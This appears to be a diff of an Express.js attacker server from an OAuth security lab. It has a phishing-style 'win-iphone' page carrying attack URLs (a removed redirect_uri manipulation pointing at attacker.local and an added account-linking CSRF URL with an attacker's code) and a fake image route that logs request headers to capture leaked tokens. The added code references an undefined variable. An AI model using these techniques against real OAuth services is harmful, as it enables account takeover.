@@ -16,10 +16,19 @@ app.get('/', (req, res) => {
 
 
 app.get('/win-iphone', (req,res) => {
-    let attack = "http://oauth-provider.local/oauth/authorize/?response_type=code&client_id=QRCgN910n7Rr4s3Ee8bf&redirect_uri=http://attacker.local%3Fhttp://preApprovalApp.local/oauth/callback"
+    
+    // let attackURL = "http://oauth-provider.local/oauth/authorize/?response_type=code&client_id=q9O0kwqgxloGk5TPLzEF&redirect_uri=http://example-client.local/profile/link/oauth/callback";
+
+    let attackURL = "http://example-client.local/profile/link/oauth/callback/?code=[AttackerCode]";
+
     res.render('iphone', {
         attack_url: attack
     })
+})
+  
+app.get('/fake-img.jpg', (req,res) => {
+    console.log('headers',req.rawHeaders, req.headers)
+    res.send('invalid')
 })
 
 app.listen(port, () => {
